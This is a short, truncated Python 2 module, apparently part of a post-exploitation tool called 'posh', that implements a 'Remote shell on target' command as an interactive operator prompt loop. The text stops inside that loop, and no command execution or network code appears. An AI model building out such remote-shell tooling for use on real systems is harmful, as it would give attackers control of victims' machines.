#!/usr/bin/env python3

# imports
import module
import re
import os
import select
import subprocess as sp

MODNAME = 'shell'
POSH_PROMPT = 'posh > '
USAGE = """Remote shell on target.
usage: shell [-h]
\noptions:
-h\t\tshow help"""


@module.server_handler(MODNAME)
def server(server, argv):
    if len(argv) > 1:
        print USAGE
        return 
    
    prompt = server.conn.exchange('getprompt')
    while True:
        try:
            inp = raw_input(POSH_PROMPT + prompt).strip()
        except KeyboardInterrupt:
            print
            continue
        except EOFError:
            print
            break

            